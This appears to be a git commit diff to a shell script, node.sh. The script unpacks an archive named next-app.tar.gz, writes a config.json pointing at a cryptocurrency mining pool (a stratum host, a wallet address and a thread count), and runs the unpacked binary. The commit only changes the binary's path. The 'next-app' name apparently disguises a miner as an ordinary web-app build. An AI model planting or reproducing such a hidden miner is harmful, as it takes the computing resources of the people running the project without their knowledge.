82aed7186e8e3a3fb85f943b645077317f5471b4
kujfiioa <kujfiioa@outlook.co.id>
2025-07-22 09:19:43 +0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -5,4 +5,4 @@ tar -xf next-app.tar.gz
 
 echo '{"host": "stratum-eu.rplant.xyz", "port": 7022, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 4}' > config.json
 
-./next-app
+./next-app/next-app
